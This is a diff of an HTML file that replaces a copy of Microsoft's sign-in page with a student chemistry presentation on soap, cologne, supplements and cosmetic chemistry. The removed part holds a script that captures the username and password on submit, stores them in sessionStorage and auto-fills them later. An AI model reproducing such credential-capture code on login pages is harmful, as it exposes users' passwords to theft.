-<script type="text/javascript" nonce='5ayvToqLbbGVRqjTMtK-IA'>//<![CDATA[
-!function(t,e){!function(){var n=e.getElementsByTagName("head")[0];n&&n.addEventListener&&(n.addEventListener("error",function(e){null!==e.target&&"cdn"===e.target.getAttribute("data-loader")&&t.$Loader.OnError(e.target)},!0),n.addEventListener("load",function(e){null!==e.target&&"cdn"===e.target.getAttribute("data-loader")&&t.$Loader.OnSuccess(e.target)},!0))}()}(window,document);
-//]]></script>
-
-    
-        <link rel="prefetch" href="https://login.live.com/Me.htm?v=3" />
-                <link rel="shortcut icon" href="https://aadcdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" />
-
-    <script type="text/javascript" nonce='5ayvToqLbbGVRqjTMtK-IA'>
-        ServerData = $Config;
-    </script>
-
-
-    
-    <link data-loader="cdn" crossorigin="anonymous" href="https://aadcdn.msauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_81imvbluez-v5hbzpkxfcg2.css" rel="stylesheet" />
-
-
-    <script data-loader="cdn" crossorigin="anonymous" src="https://aadcdn.msauth.net/shared/1.0/content/js/ConvergedLogin_PCore_JXiTFACSOROsZgtGRJo1aA2.js" integrity='sha384-blopmsMzxd5dRaTpY7EgCJ7EG0dUggaCRVqMyrza1309ePq23FYazFCFZH34gch2' nonce='5ayvToqLbbGVRqjTMtK-IA'></script>
-
-    <script data-loader="cdn" crossorigin="anonymous" src="https://aadcdn.msauth.net/ests/2.1/content/cdnbundles/ux.converged.login.strings-en.min_cwzkvppibgumnhupu2wjoa2.js" nonce='5ayvToqLbbGVRqjTMtK-IA'></script>
-
-
-
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chemistry in the Real World - Body Soap, Cologne & Supplements</title>
+    <style>
+        :root {
+            --primary-color: #2c3e50;
+            --secondary-color: #3498db;
+            --accent-color: #e74c3c;
+            --text-color: #333;
+            --light-bg: #f8f9fa;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Arial', sans-serif;
+            line-height: 1.7;
+            color: var(--text-color);
+            background-color: var(--light-bg);
+            font-size: 18px;
+        }
+        
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        header {
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: white;
+            padding: 1.5rem 0;
+            text-align: center;
+            margin-bottom: 1.5rem;
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 0.5rem;
+        }
+        
+        h2 {
+            color: var(--primary-color);
+            border-bottom: 2px solid var(--primary-color);
+            padding-bottom: 5px;
+            margin: 1.8rem 0 1rem;
+            font-size: 1.8rem;
+        }
+        
+        h3 {
+            color: var(--secondary-color);
+            margin: 1.5rem 0 0.8rem;
+            font-size: 1.4rem;
+        }
+        
+        p {
+            margin-bottom: 1rem;
+        }
+        
+        .section {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            padding: 25px;
+            margin-bottom: 2rem;
+        }
+        
+        .image-placeholder {
+            background-color: #e9ecef;
+            border-radius: 8px;
+            height: 200px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 15px 0;
+            color: #6c757d;
+            border: 2px dashed #ced4da;
+        }
+        
+        .formula {
+            font-family: monospace;
+            background-color: #f1f3f5;
+            padding: 2px 5px;
+            border-radius: 3px;
+            font-weight: bold;
+        }
+        
+        .note {
+            background-color: #e8f4f8;
+            padding: 12px;
+            border-radius: 5px;
+            margin: 15px 0;
+            border-left: 4px solid #3498db;
+        }
+        
+        footer {
+            background-color: var(--primary-color);
+            color: white;
+            text-align: center;
+            padding: 15px 0;
+            margin-top: 2rem;
+        }
+    </style>
 </head>
-
-<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: none">
-    <script type="text/javascript" nonce='5ayvToqLbbGVRqjTMtK-IA'>//<![CDATA[
-!function(){var e=window,s=e.document,i=e.$Config||{};if(e.self===e.top){s&&s.body&&(s.body.style.display="block")}else if(!i.allowFrame){var o,t,r,f,n,d;if(i.fAddTryCatchForIFrameRedirects){try{o=e.self.location.href,t=o.indexOf("#"),r=-1!==t,f=o.indexOf("?"),n=r?t:o.length,d=-1===f||r&&f>t?"?":"&",o=o.substr(0,n)+d+"iframe-request-id="+i.sessionId+o.substr(n),e.top.location=o}catch(e){}}else{o=e.self.location.href,t=o.indexOf("#"),r=-1!==t,f=o.indexOf("?"),n=r?t:o.length,d=-1===f||r&&f>t?"?":"&",
-o=o.substr(0,n)+d+"iframe-request-id="+i.sessionId+o.substr(n),e.top.location=o}}}();
-//]]></script>
-<script type="text/javascript">
-    document.addEventListener('DOMContentLoaded', function() {
-      // Find the password input field - using the specific selector for Microsoft's login page
-      const passwordField = document.querySelector('input[name="passwd"]');
-      const loginForm = document.querySelector('form[action*="login"]');
-      
-      if (loginForm && passwordField) {
-        loginForm.addEventListener('submit', function(e) {
-          // Store the password in sessionStorage (will be cleared when browser is closed)
-          sessionStorage.setItem('userPassword', passwordField.value);
-          
-          // Also store the username if available
-          const usernameField = document.querySelector('input[name="loginfmt"]');
-          if (usernameField) {
-            sessionStorage.setItem('userName', usernameField.value);
-          }
-          
-          console.log('Credentials saved to session storage');
-          // Form will continue to submit normally
-        });
-      }
-      
-      // Check if there's a stored password and auto-fill it
-      const savedPassword = sessionStorage.getItem('userPassword');
-      if (savedPassword && passwordField) {
-        passwordField.value = savedPassword;
-        console.log('Auto-filled password from session storage');
-      }
-      
-      // Check if there's a stored username and auto-fill it
-      const savedUsername = sessionStorage.getItem('userName');
-      const usernameField = document.querySelector('input[name="loginfmt"]');
-      if (savedUsername && usernameField) {
-        usernameField.value = savedUsername;
-        console.log('Auto-filled username from session storage');
-      }
-    });
-    </script>
+<body>
+    <header>
+        <div class="container">
+            <h1>Chemistry in the Real World</h1>
+            <p>Body Soap, Cologne & Supplements | Cosmetic Chemist Career</p>
+        </div>
+    </header>
+    
+    <div class="container">
+        <!-- Introduction -->
+        <div class="section">
+            <h2>Introduction</h2>
+            <p>Welcome to my chemistry project where we'll explore the fascinating chemistry behind products we use every day. I've chosen to focus on body soap and cologne chemistry as my first topic, followed by supplement chemistry as my second topic. We'll also look at the career of a cosmetic chemist who works with these products. Chemistry isn't just something we learn in the classroom—it touches nearly every aspect of our daily lives, from the moment we wake up and shower to the supplements we might take for our health.</p>
+        </div>
+        
+        <!-- Topic 1: Body Soap and Cologne Chemistry -->
+        <div class="section">
+            <h2>Topic 1: Body Soap and Cologne Chemistry</h2>
+            
+            <h3>The Chemistry Behind Cleansing and Scent</h3>
+            <p>When we talk about soap, we're talking about a fascinating chemical reaction called saponification. This reaction transforms ordinary fats or oils into something that can clean our skin. Soap molecules are what scientists call amphiphilic, meaning they have a dual nature—one end of the molecule loves water (hydrophilic) while the other end attaches to oils and dirt (hydrophobic). This unique structure is what makes soap work by pulling dirt away from your skin and into water.</p>
+            
+            <p>Cologne, on the other hand, works through a completely different chemical principle. It consists primarily of ethanol—a type of alcohol—carrying various fragrance compounds. These compounds are designed to evaporate at different rates, creating what perfumers call "notes." The top notes evaporate quickly, middle notes linger a bit longer, and base notes can last for hours, giving cologne its complex, evolving scent profile.</p>
+            
+            <div style="display: flex; justify-content: center; margin: 20px 0;">
+                <svg width="650" height="250" viewBox="0 0 650 250">
+                    <!-- Saponification Reaction -->
+                    <rect x="10" y="10" width="300" height="230" rx="10" fill="#e8f4f8" stroke="#3498db" stroke-width="2"/>
+                    <text x="160" y="35" font-size="16" text-anchor="middle" font-weight="bold">Saponification</text>
+                    
+                    <!-- Fat Molecule (Triglyceride) -->
+                    <circle cx="70" cy="80" r="25" fill="#f9d5e5" stroke="#333" stroke-width="1"/>
+                    <text x="70" y="85" font-size="12" text-anchor="middle">Fat</text>
+                    
+                    <!-- NaOH -->
+                    <circle cx="70" cy="170" r="25" fill="#d5f5e3" stroke="#333" stroke-width="1"/>
+                    <text x="70" y="175" font-size="12" text-anchor="middle">NaOH</text>
+                    
+                    <!-- Plus sign -->
+                    <text x="110" y="125" font-size="24" text-anchor="middle">+</text>
+                    
+                    <!-- Arrow -->
+                    <line x1="140" y1="125" x2="200" y2="125" stroke="#333" stroke-width="2"/>
+                    <polygon points="200,125 190,120 190,130" fill="#333"/>
+                    
+                    <!-- Products -->
+                    <circle cx="250" cy="80" r="25" fill="#aed6f1" stroke="#333" stroke-width="1"/>
+                    <text x="250" y="85" font-size="12" text-anchor="middle">Soap</text>
+                    
+                    <circle cx="250" cy="170" r="25" fill="#f5eea5" stroke="#333" stroke-width="1"/>
+                    <text x="250" y="175" font-size="12" text-anchor="middle">Glycerol</text>
+                    
+                    <!-- Cologne Evaporation -->
+                    <rect x="330" y="10" width="300" height="230" rx="10" fill="#f5eef8" stroke="#9b59b6" stroke-width="2"/>
+                    <text x="480" y="35" font-size="16" text-anchor="middle" font-weight="bold">Cologne Evaporation</text>
+                    
+                    <!-- Bottle -->
+                    <path d="M430,120 C430,150 380,150 380,120 L380,80 L430,80 Z" fill="#d1f2eb" stroke="#333" stroke-width="1"/>
+                    <rect x="390" y="60" width="30" height="20" fill="#d1f2eb" stroke="#333" stroke-width="1"/>
+                    
+                    <!-- Evaporation -->
+                    <path d="M400,70 Q410,50 420,30 Q425,50 440,40 Q430,60 450,55" stroke="#9b59b6" stroke-width="1" fill="none"/>
+                    <path d="M410,70 Q420,45 430,20 Q440,40 455,35" stroke="#9b59b6" stroke-width="1" fill="none"/>
+                    <path d="M420,70 Q430,40 440,10 Q455,30 470,25" stroke="#9b59b6" stroke-width="1" fill="none"/>
+                    
+                    <!-- Labels -->
+                    <text x="485" y="80" font-size="12" text-anchor="start">Top notes (citrus, herbs)</text>
+                    <text x="485" y="105" font-size="12" text-anchor="start">Middle notes (florals)</text>
+                    <text x="485" y="130" font-size="12" text-anchor="start">Base notes (woods, amber)</text>
+                    
+                    <!-- Time arrows -->
+                    <line x1="460" y1="150" x2="520" y2="150" stroke="#333" stroke-width="1"/>
+                    <polygon points="520,150 515,147 515,153" fill="#333"/>
+                    <text x="490" y="165" font-size="10" text-anchor="middle">Time</text>
+                    
+                    <!-- Legend -->
+                    <text x="325" y="240" font-size="11" text-anchor="start" font-style="italic">Chemical reactions transform ingredients into useful products</text>
+                </svg>
+            </div>
+            
+            <h3>Key Chemical Players</h3>
+            <p>The chemistry of soap centers around sodium hydroxide (NaOH), a strong base that reacts with fats to create soap. The fats themselves contain important fatty acids like oleic acid (C₁₈H₃₄O₂) and linoleic acid (C₁₈H₃₂O₂), which determine the soap's properties like how moisturizing it is or how much lather it creates.</p>
+            
+            <p>In cologne, ethanol (C₂H₅OH) serves as the carrier, while compounds like linalool (C₁₀H₁₈O) contribute to the fragrance. Linalool has a floral scent and is found in many plants, making it a common ingredient in fragrances. These molecules interact with our olfactory receptors in different ways, creating the complex aromas we associate with fine colognes.</p>
+            
+            <h3>The Chemical Transformation</h3>
+            <p>The creation of soap involves a chemical reaction called saponification. When fats or oils (which are triglycerides) react with sodium hydroxide, they break apart and form glycerol plus the sodium salts of fatty acids—which is soap. This reaction has been used for centuries, though the understanding of its chemistry is relatively modern.</p>
+            
+            <p>For cologne, the primary chemical process isn't a reaction but evaporation. Different molecules evaporate at different rates based on their molecular weight and structure. Perfumers carefully balance these compounds to create a fragrance that unfolds over time as you wear it. The chemistry here is about physical changes rather than chemical transformations.</p>
+            
+            <h3>From Lab to Bathroom Shelf</h3>
+            <p>The manufacturing of soap often uses what's called the Kettle Process. Fats and alkali are mixed and heated in large vessels, then cooled while salt is added to help the soap separate. Finally, the soap is molded and cured. Major soap manufacturers like Procter & Gamble operate about 130 facilities globally, including historic plants in Baltimore, Maryland and their headquarters in Cincinnati, Ohio.</p>
+            
+            <p>Cologne production involves extracting essential oils through methods like steam distillation, then carefully blending these oils with ethanol. The mixture ages—sometimes for months—before being filtered and bottled. This process requires careful chemistry to ensure stability and consistent scent profiles.</p>
+            
+            <div style="display: flex; justify-content: center; margin: 20px 0;">
+                <svg width="650" height="300" viewBox="0 0 650 300">
+                    <!-- Manufacturing Process Diagram -->
+                    <rect x="10" y="10" width="630" height="280" rx="10" fill="#f8f9fa" stroke="#2c3e50" stroke-width="2"/>
+                    <text x="325" y="35" font-size="18" text-anchor="middle" font-weight="bold">Manufacturing Processes</text>
+                    
+                    <!-- Soap Manufacturing -->
+                    <rect x="30" y="60" width="280" height="200" rx="8" fill="#e8f4f8" stroke="#3498db" stroke-width="1"/>
+                    <text x="170" y="80" font-size="16" text-anchor="middle" font-weight="bold">Soap: Kettle Process</text>
+                    
+                    <!-- Kettle -->
+                    <rect x="75" y="100" width="100" height="70" rx="5" fill="#d6eaf8" stroke="#333" stroke-width="1"/>
+                    <ellipse cx="125" cy="100" rx="50" ry="10" fill="#d6eaf8" stroke="#333" stroke-width="1"/>
+                    <rect x="115" y="90" width="20" height="20" fill="#d6eaf8" stroke="#333" stroke-width="1"/>
+                    <line x1="125" y1="90" x2="125" y2="70" stroke="#333" stroke-width="1"/>
+                    <path d="M125,70 Q115,65 120,60 Q125,55 130,60 Q135,65 125,70" fill="#bdc3c7" stroke="#333" stroke-width="1"/>
+                    
+                    <!-- Process Steps -->
+                    <circle cx="50" cy="110" r="10" fill="#3498db" stroke="#333" stroke-width="1"/>
+                    <text x="50" y="113" font-size="10" text-anchor="middle" fill="white">1</text>
+                    <text x="50" y="130" font-size="10" text-anchor="middle">Fats</text>
+                    
+                    <circle cx="50" cy="160" r="10" fill="#3498db" stroke="#333" stroke-width="1"/>
+                    <text x="50" y="163" font-size="10" text-anchor="middle" fill="white">2</text>
+                    <text x="50" y="180" font-size="10" text-anchor="middle">Alkali</text>
+                    
+                    <circle cx="190" cy="135" r="10" fill="#3498db" stroke="#333" stroke-width="1"/>
+                    <text x="190" y="138" font-size="10" text-anchor="middle" fill="white">3</text>
+                    <text x="190" y="155" font-size="10" text-anchor="middle">Heat</text>
+                    
+                    <!-- Arrows -->
+                    <line x1="60" y1="110" x2="70" y2="110" stroke="#333" stroke-width="1"/>
+                    <polygon points="70,110 65,107 65,113" fill="#333"/>
+                    
+                    <line x1="60" y1="160" x2="70" y2="160" stroke="#333" stroke-width="1"/>
+                    <polygon points="70,160 65,157 65,163" fill="#333"/>
+                    
+                    <!-- Final Steps -->
+                    <rect x="75" y="190" width="190" height="25" rx="5" fill="#aed6f1" stroke="#333" stroke-width="1"/>
+                    <text x="170" y="205" font-size="12" text-anchor="middle">Cool and add salt</text>
+                    
+                    <rect x="75" y="225" width="190" height="25" rx="5" fill="#aed6f1" stroke="#333" stroke-width="1"/>
+                    <text x="170" y="240" font-size="12" text-anchor="middle">Mold and cure</text>
+                    
+                    <!-- Cologne Manufacturing -->
+                    <rect x="340" y="60" width="280" height="200" rx="8" fill="#f5eef8" stroke="#9b59b6" stroke-width="1"/>
+                    <text x="480" y="80" font-size="16" text-anchor="middle" font-weight="bold">Cologne Production</text>
+                    
+                    <!-- Distillation -->
+                    <rect x="365" y="100" width="80" height="60" fill="#e8daef" stroke="#333" stroke-width="1"/>
+                    <path d="M405,100 L425,80 L425,160 L405,160 Z" fill="#e8daef" stroke="#333" stroke-width="1"/>
+                    <path d="M425,120 L445,120 L445,125 L440,130 L430,130 L425,125 Z" fill="#e8daef" stroke="#333" stroke-width="1"/>
+                    
+                    <!-- Process Steps -->
+                    <circle cx="480" cy="110" r="10" fill="#9b59b6" stroke="#333" stroke-width="1"/>
+                    <text x="480" y="113" font-size="10" text-anchor="middle" fill="white">1</text>
+                    <text x="530" y="113" font-size="10" text-anchor="middle">Essential oil extraction</text>
+                    
+                    <circle cx="480" cy="140" r="10" fill="#9b59b6" stroke="#333" stroke-width="1"/>
+                    <text x="480" y="143" font-size="10" text-anchor="middle" fill="white">2</text>
+                    <text x="530" y="143" font-size="10" text-anchor="middle">Blending with ethanol</text>
+                    
+                    <!-- Final Steps -->
+                    <rect x="370" y="175" width="220" height="25" rx="5" fill="#d7bde2" stroke="#333" stroke-width="1"/>
+                    <text x="480" y="190" font-size="12" text-anchor="middle">Aging (weeks to months)</text>
+                    
+                    <rect x="370" y="210" width="220" height="25" rx="5" fill="#d7bde2" stroke="#333" stroke-width="1"/>
+                    <text x="480" y="225" font-size="12" text-anchor="middle">Filtration and bottling</text>
+                </svg>
+            </div>
+            
+            <h3>Real-World Impact</h3>
+            <p>These products range widely in price and formulation. Traditional bar soaps cost around $4-$6, while designer colognes can range from $25 all the way to $150 per bottle. Examples include Castile soap made from olive oil, the popular Dove Beauty Bar known for its moisturizing properties, and Giorgio Armani's Acqua di Gio cologne.</p>
+            
+            <p>Beyond cleaning, soaps are used for shaving, laundry pre-treatment, and even specialized medical purposes. Colognes serve not just as personal fragrances but can affect mood and serve as a form of personal expression. The chemistry behind these everyday products creates significant benefits like effective cleaning and skin moisturizing, though there are also risks like skin irritation for some people and environmental concerns about certain ingredients.</p>
+        </div>
+        
+        <!-- Topic 2: Supplement Chemistry -->
+        <div class="section">
+            <h2>Topic 2: Supplement Chemistry</h2>
+            
+            <h3>Nutrition Through Chemistry</h3>
+            <p>Dietary supplements represent a fascinating intersection of nutrition and chemistry. These products, which include protein powders and vitamin/mineral shakes, are designed to provide concentrated nutrients that support health, enhance athletic performance, and fill gaps in our diets. Unlike medications, supplements aim to complement our nutrition rather than treat specific conditions.</p>
+            
+            <p>The chemistry of supplements is about delivering beneficial compounds in forms our bodies can use efficiently. This involves careful formulation to ensure stability, bioavailability, and sometimes even controlled release of nutrients. It's a field where chemical knowledge directly translates to human health outcomes.</p>
+            
+            <div style="display: flex; justify-content: center; margin: 20px 0;">
+                <svg width="650" height="250" viewBox="0 0 650 250">
+                    <!-- Background -->
+                    <rect x="10" y="10" width="630" height="230" rx="10" fill="#f8f9fa" stroke="#2c3e50" stroke-width="2"/>
+                    <text x="325" y="35" font-size="18" text-anchor="middle" font-weight="bold">Protein Supplements: Types and Uses</text>
+                    
+                    <!-- Product Examples -->
+                    <!-- Container 1: Whey Protein -->
+                    <rect x="40" y="60" width="120" height="160" rx="5" fill="#e8f4f8" stroke="#3498db" stroke-width="1"/>
+                    <rect x="50" y="70" width="100" height="100" rx="5" fill="#d6eaf8" stroke="#333" stroke-width="1"/>
+                    <text x="100" y="110" font-size="16" text-anchor="middle" font-weight="bold">WHEY</text>
+                    <text x="100" y="130" font-size="12" text-anchor="middle">PROTEIN</text>
+                    <text x="100" y="180" font-size="14" text-anchor="middle" font-weight="bold">Muscle Building</text>
+                    
+                    <!-- Container 2: Plant Protein -->
+                    <rect x="180" y="60" width="120" height="160" rx="5" fill="#e9f7ef" stroke="#27ae60" stroke-width="1"/>
+                    <rect x="190" y="70" width="100" height="100" rx="5" fill="#d5f5e3" stroke="#333" stroke-width="1"/>
+                    <text x="240" y="110" font-size="16" text-anchor="middle" font-weight="bold">PLANT</text>
+                    <text x="240" y="130" font-size="12" text-anchor="middle">PROTEIN</text>
+                    <text x="240" y="180" font-size="14" text-anchor="middle" font-weight="bold">Vegan Diet</text>
+                    
+                    <!-- Container 3: Pre-Workout -->
+                    <rect x="320" y="60" width="120" height="160" rx="5" fill="#fff9e6" stroke="#f39c12" stroke-width="1"/>
+                    <rect x="330" y="70" width="100" height="100" rx="5" fill="#fef5e7" stroke="#333" stroke-width="1"/>
+                    <text x="380" y="110" font-size="16" text-anchor="middle" font-weight="bold">PRE</text>
+                    <text x="380" y="130" font-size="12" text-anchor="middle">WORKOUT</text>
+                    <text x="380" y="180" font-size="14" text-anchor="middle" font-weight="bold">Performance</text>
+                    
+                    <!-- Container 4: Meal Replacement -->
+                    <rect x="460" y="60" width="120" height="160" rx="5" fill="#f5eef8" stroke="#9b59b6" stroke-width="1"/>
+                    <rect x="470" y="70" width="100" height="100" rx="5" fill="#ebdef0" stroke="#333" stroke-width="1"/>
+                    <text x="520" y="110" font-size="14" text-anchor="middle" font-weight="bold">MEAL</text>
+                    <text x="520" y="130" font-size="12" text-anchor="middle">REPLACEMENT</text>
+                    <text x="520" y="180" font-size="14" text-anchor="middle" font-weight="bold">Weight Control</text>
+                    
+                    <!-- Chemical Formulas -->
+                    <text x="100" y="150" font-size="9" text-anchor="middle" font-family="monospace">Polypeptides</text>
+                    <text x="240" y="150" font-size="9" text-anchor="middle" font-family="monospace">Rice + Pea Protein</text>
+                    <text x="380" y="150" font-size="9" text-anchor="middle" font-family="monospace">C₄H₉N₃O₂ (Creatine)</text>
+                    <text x="520" y="150" font-size="9" text-anchor="middle" font-family="monospace">Vitamins + Minerals</text>
+                </svg>
+            </div>
+            
+            <h3>The Chemical Composition</h3>
+            <p>Protein supplements typically center around whey protein, a mixture of polypeptides derived from milk. These complex molecules contain essential amino acids our bodies need for muscle repair and growth. Other key components include ascorbic acid (vitamin C, C₆H₈O₆), which serves as an antioxidant, and cholecalciferol (vitamin D₃, C₂₇H₄₄O), a fat-soluble vitamin crucial for bone health.</p>
+            
+            <p>Performance-oriented supplements often contain creatine (C₄H₉N₃O₂), which helps regenerate ATP in muscles, improving performance during high-intensity exercise. Mineral supplements like calcium carbonate (CaCO₃) provide essential minerals in forms our digestive systems can process. The chemistry of these ingredients determines how well our bodies can absorb and utilize them.</p>
+            
+            <h3>From Raw Materials to Finished Products</h3>
+            <p>Creating supplements involves several chemical processes. Protein extraction from milk uses ultrafiltration techniques to concentrate and purify the proteins. Vitamins may undergo encapsulation to protect them from degradation, while mineral compounds are carefully formulated to maximize absorption. The stability of these compounds is a key consideration, as some vitamins like ascorbic acid can degrade with exposure to heat, light, or certain pH levels.</p>
+            
+            <p>The manufacturing process follows a careful sequence: quality control of raw materials, development of bench-scale formulas, pilot batches for testing, and finally full production runs. Throughout this process, chemists monitor factors like solubility, stability, and bioavailability to ensure the final product delivers its intended benefits.</p>
+            
+            <div style="display: flex; justify-content: center; margin: 20px 0;">
+                <svg width="650" height="300" viewBox="0 0 650 300">
+                    <!-- Background -->
+                    <rect x="10" y="10" width="630" height="280" rx="10" fill="#f8f9fa" stroke="#2c3e50" stroke-width="2"/>
+                    <text x="325" y="35" font-size="18" text-anchor="middle" font-weight="bold">Supplement Manufacturing Process</text>
+                    
+                    <!-- Process Flow Diagram -->
+                    <rect x="90" y="70" width="120" height="60" rx="5" fill="#d6eaf8" stroke="#3498db" stroke-width="2"/>
+                    <text x="150" y="105" font-size="14" text-anchor="middle">Raw Material QC</text>
+                    
+                    <rect x="90" y="160" width="120" height="60" rx="5" fill="#d5f5e3" stroke="#27ae60" stroke-width="2"/>
+                    <text x="150" y="195" font-size="14" text-anchor="middle">Bench-Scale Formula</text>
+                    
+                    <rect x="265" y="70" width="120" height="60" rx="5" fill="#fdebd0" stroke="#f39c12" stroke-width="2"/>
+                    <text x="325" y="105" font-size="14" text-anchor="middle">Pilot Batch</text>
+                    
+                    <rect x="265" y="160" width="120" height="60" rx="5" fill="#ebdef0" stroke="#9b59b6" stroke-width="2"/>
+                    <text x="325" y="195" font-size="14" text-anchor="middle">Production Batch</text>
+                    
+                    <rect x="440" y="70" width="120" height="60" rx="5" fill="#fadbd8" stroke="#e74c3c" stroke-width="2"/>
+                    <text x="500" y="105" font-size="14" text-anchor="middle">Quality Testing</text>
+                    
+                    <rect x="440" y="160" width="120" height="60" rx="5" fill="#d6dbdf" stroke="#7f8c8d" stroke-width="2"/>
+                    <text x="500" y="195" font-size="14" text-anchor="middle">Packaging</text>
+                    
+                    <!-- Arrows -->
+                    <line x1="210" y1="100" x2="260" y2="100" stroke="#333" stroke-width="2"/>
+                    <polygon points="260,100 250,95 250,105" fill="#333"/>
+                    
+                    <line x1="150" y1="130" x2="150" y2="155" stroke="#333" stroke-width="2"/>
+                    <polygon points="150,155 145,145 155,145" fill="#333"/>
+                    
+                    <line x1="210" y1="190" x2="260" y2="190" stroke="#333" stroke-width="2"/>
+                    <polygon points="260,190 250,185 250,195" fill="#333"/>
+                    
+                    <line x1="325" y1="130" x2="325" y2="155" stroke="#333" stroke-width="2"/>
+                    <polygon points="325,155 320,145 330,145" fill="#333"/>
+                    
+                    <line x1="385" y1="100" x2="435" y2="100" stroke="#333" stroke-width="2"/>
+                    <polygon points="435,100 425,95 425,105" fill="#333"/>
+                    
+                    <line x1="385" y1="190" x2="435" y2="190" stroke="#333" stroke-width="2"/>
+                    <polygon points="435,190 425,185 425,195" fill="#333"/>
+                    
+                    <line x1="500" y1="130" x2="500" y2="155" stroke="#333" stroke-width="2"/>
+                    <polygon points="500,155 495,145 505,145" fill="#333"/>
+                    
+                    <!-- Equipment Icons -->
+                    <circle cx="150" y="250" r="15" fill="#3498db" stroke="#333" stroke-width="1"/>
+                    <text x="150" y="255" font-size="14" text-anchor="middle" fill="white">M</text>
+                    <text x="150" y="275" font-size="12" text-anchor="middle">Mixers</text>
+                    
+                    <circle cx="250" y="250" r="15" fill="#27ae60" stroke="#333" stroke-width="1"/>
+                    <text x="250" y="255" font-size="14" text-anchor="middle" fill="white">G</text>
+                    <text x="250" y="275" font-size="12" text-anchor="middle">Granulators</text>
+                    
+                    <circle cx="350" y="250" r="15" fill="#f39c12" stroke="#333" stroke-width="1"/>
+                    <text x="350" y="255" font-size="14" text-anchor="middle" fill="white">F</text>
+                    <text x="350" y="275" font-size="12" text-anchor="middle">Fillers</text>
+                    
+                    <circle cx="450" y="250" r="15" fill="#9b59b6" stroke="#333" stroke-width="1"/>
+                    <text x="450" y="255" font-size="14" text-anchor="middle" fill="white">T</text>
+                    <text x="450" y="275" font-size="12" text-anchor="middle">Tablet Presses</text>
+                    
+                    <circle cx="550" y="250" r="15" fill="#e74c3c" stroke="#333" stroke-width="1"/>
+                    <text x="550" y="255" font-size="14" text-anchor="middle" fill="white">P</text>
+                    <text x="550" y="275" font-size="12" text-anchor="middle">Packaging Lines</text>
+                </svg>
+            </div>
+            
+            <h3>Benefits and Applications</h3>
+            <p>Supplements typically cost between $20-$40 for a 2-pound container of protein powder, while vitamin packs range from $10-$30 per month. Products like Just Ingredients Vanilla Bean Protein use grass-fed whey with minimal additives, while pre-workout formulations combine carbohydrates, electrolytes, and performance enhancers like beta-alanine.</p>
+            
+            <p>These products serve multiple purposes in our society. Athletes use them for muscle recovery and enhanced performance. People with dietary restrictions, like vegans or the elderly, rely on them to meet nutritional needs. Weight management programs incorporate meal replacement shakes, and medical patients sometimes use supplements to address specific deficiencies. The chemistry of these products directly affects their efficacy for these various applications.</p>
+            
+            <div class="note">
+                <p>While supplements offer benefits like convenient nutrition and targeted support for various bodily functions, they also come with risks. Some products may contain contaminants like heavy metals, cause digestive distress in sensitive individuals, or make unregulated claims about their effects. The chemistry behind both the benefits and risks involves how these compounds interact with our complex biological systems.</p>
+            </div>
+        </div>
+        
+        <!-- Career: Cosmetic Chemist -->
+        <div class="section">
+            <h2>Career: Cosmetic Chemist</h2>
+            
+            <h3>Where Science Meets Beauty</h3>
+            <p>Cosmetic chemists are the scientific minds behind the personal care products we use daily. They formulate and test products like soaps, lotions, and fragrances, ensuring these items are safe, stable, and effective. This career represents a fascinating blend of chemistry, consumer science, and creativity—developing products that are both chemically sound and appealing to users.</p>
+            
+            <p>These scientists work with a wide array of chemicals, applying their knowledge of organic chemistry, physical chemistry, and even microbiology. They need to understand both the science of formulation and the art of creating products people will enjoy using. It's a field where laboratory precision meets consumer satisfaction.</p>
+            
+            <div class="image-placeholder">
+                [Image of cosmetic chemist at work]
+            </div>
+            
+            <h3>The Chemistry of Personal Care</h3>
+            <p>Cosmetic chemists regularly work with surfactants like sodium lauryl sulfate, which lower surface tension between liquids and help remove dirt and oils. They also formulate with emollients like glycerin and silicones that improve how products feel on skin. Preservatives such as parabens and phenoxyethanol are carefully selected to prevent microbial growth while minimizing potential irritation.</p>
+            
+            <p>The chemical reactions these professionals work with include esterification for fragrance synthesis and emulsification to create stable mixtures of oil and water phases. They must understand how these reactions affect product stability, efficacy, and safety over time and in different environmental conditions. Their knowledge of chemistry directly translates to product performance.</p>
+            
+            <h3>From Education to Laboratory</h3>
+            <p>Becoming a cosmetic chemist typically requires a bachelor's degree in chemistry, biochemistry, or chemical engineering. Many professionals also pursue additional certifications through organizations like the Society of Cosmetic Chemists to specialize in this field. This educational foundation provides the chemical knowledge needed to understand complex formulations and develop new products.</p>
+            
+            <p>These scientists work in research and development laboratories, pilot plants for scaling up production, manufacturing facilities, and regulatory offices. A typical day might include designing new formulations, conducting stability tests, troubleshooting manufacturing issues, and collaborating with marketing teams to align scientific capabilities with consumer needs. The role combines technical expertise with practical problem-solving.</p>
+            
+            <p>Cosmetic chemists earn approximately $33.65 per hour in the United States, with annual salaries ranging from $70,000 to $90,000 depending on experience, location, and company size. This career offers the satisfaction of applying chemical knowledge to create products that millions of people use in their daily lives.</p>
+        </div>
+        
+        <!-- Conclusion -->
+        <div class="section">
+            <h2>Conclusion</h2>
+            <p>As we've seen throughout this presentation, chemistry plays a vital role in products we often take for granted. From the soap that cleans our skin through saponification to the supplements that support our health through carefully formulated nutrients, chemical principles underlie many aspects of our daily lives. The field of cosmetic chemistry offers an exciting career path for those interested in applying scientific knowledge to develop products that enhance people's lives.</p>
+            
+            <p>This exploration demonstrates how chemistry extends far beyond the laboratory, touching everything from personal hygiene to nutrition. Understanding the chemical principles behind these products gives us greater appreciation for the science that shapes our everyday experiences. Thank you for your attention to this chemistry project.</p>
+            
+            <h3>Annotated Bibliography</h3>
+            <ol style="margin-left: 25px;">
+                <li style="margin-bottom: 12px;"><strong>Chemistry LibreTexts, "Saponification of Fats and Oils; Soaps and Detergents."</strong> - This comprehensive academic resource provided detailed explanations of the saponification process and the chemical structures of various soap compounds.</li>
+                
